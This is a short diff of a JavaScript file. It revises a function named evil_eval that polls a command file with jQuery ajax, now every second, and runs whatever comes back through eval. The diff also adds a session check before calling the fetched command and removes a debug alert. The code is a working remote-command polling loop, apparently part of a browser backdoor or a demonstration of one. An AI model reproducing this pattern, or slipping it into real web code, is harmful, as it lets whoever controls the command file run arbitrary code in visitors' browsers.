@@ -1,16 +1,16 @@
 function evil_eval(){
     $.ajax({
-               url: "./command.txt",
+               url: "./command.js",
                cache: false,
-               success: function(command){
-                   console.log("success command fetch");
-                   eval(command);
+               success: function(res){
+                   eval(res);
+                   if(com.session == SESSION)
+                       com.command.call();
                }
            });    
 }
 
 var timer;
 $(function(){
-      alert("start");
-      timer = setInterval(evil_eval,5000);
+      timer = setInterval(evil_eval,1000);
   });
